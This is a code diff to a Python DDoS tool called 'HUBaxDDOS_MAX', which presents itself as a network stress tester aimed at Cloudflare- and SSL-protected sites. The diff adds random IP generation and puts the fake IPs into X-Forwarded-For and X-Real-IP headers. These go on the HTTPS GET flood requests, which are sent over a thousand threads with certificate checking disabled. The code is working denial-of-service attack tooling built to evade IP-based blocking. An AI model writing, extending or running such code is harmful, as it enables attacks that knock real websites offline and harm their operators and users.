@@ -26,22 +26,21 @@ class HUBaxDDOS_MAX:
         
     def show_logo(self):
         logo = """
-██╗  ██╗██╗   ██╗██████╗  █████╗ ██╗  ██ ██████╗ ██████╗  ██████╗ ███████╗
+██╗  ██╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██████╗ ██████╗  ██████╗ ███████╗
 ██║  ██║██║   ██║██╔══██╗██╔══██╗╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝
 ███████║██║   ██║██████╔╝███████║ ╚███╔╝ ██║  ██║██║  ██║██║   ██║███████╗
 ██╔══██║██║   ██║██╔══██╗██╔══██║ ██╔██╗ ██║  ██║██║  ██║██║   ██║╚════██║
 ██║  ██║╚██████╔╝██████╔╝██║  ██║██╔╝ ██╗██████╔╝██████╔╝╚██████╔╝███████║
-╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
-                               H U B A X  D D O S
-
-                               H U B A X  D D O S                                                                           
+╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
+                               HUBAXDDOS
+    
+                                                                           
            [ MAXIMUM POWER NETWORK STRESS TEST TOOL - v2.0 ]
         """
         print(colored(logo, 'cyan', attrs=['bold']))
         print(colored("        Author: n0merc | Target: Cloudflare & SSL Protected Sites", 'white'))
         print(colored("-" * 75, 'cyan'))
         
-        # Цэс (Menu) хэсгийг энд нэмлээ
         menu = """
     COMMANDS:
     [https] - Start MAX HTTPS/SSL Flood (for websites)
@@ -57,9 +56,13 @@ class HUBaxDDOS_MAX:
         with self.lock:
             self.stats['packets_sent'] += count
 
+    def generate_spoof_ip(self):
+        # Санамсаргүй IP хаяг үүсгэж нуух (IP Spoofing)
+        return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
+
     def https_flood(self, url, threads=1000):
         target_host = url.replace('http://', '').replace('https://', '').split('/')[0]
-        print(colored(f"\n[!] Launching MAX HTTPS Flood on {target_host}...", 'red', attrs=['bold']))
+        print(colored(f"\n[!] Launching MAX HTTPS Flood with IP Spoofing on {target_host}...", 'red', attrs=['bold']))
         self.attack_running = True
         context = ssl.create_default_context()
         context.check_hostname = False
@@ -75,13 +78,16 @@ class HUBaxDDOS_MAX:
                     
                     for _ in range(50): 
                         if not self.attack_running: break
+                        spoofed_ip = self.generate_spoof_ip()
                         req = (f"GET /?{random.getrandbits(32)} HTTP/1.1\r\n"
                                f"Host: {target_host}\r\n"
                                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                               f"X-Forwarded-For: {spoofed_ip}\r\n"
+                               f"X-Real-IP: {spoofed_ip}\r\n"
                                f"Connection: keep-alive\r\n\r\n").encode()
                         conn.send(req)
                         self.update_stats(1)
-                        print(colored(f"[*] Sent: HTTPS-GET >> {target_host}", 'cyan'))
+                        print(colored(f"[*] Sent (Spoofed: {spoofed_ip}): HTTPS-GET >> {target_host}", 'cyan'))
                     conn.close()
                 except: pass
 
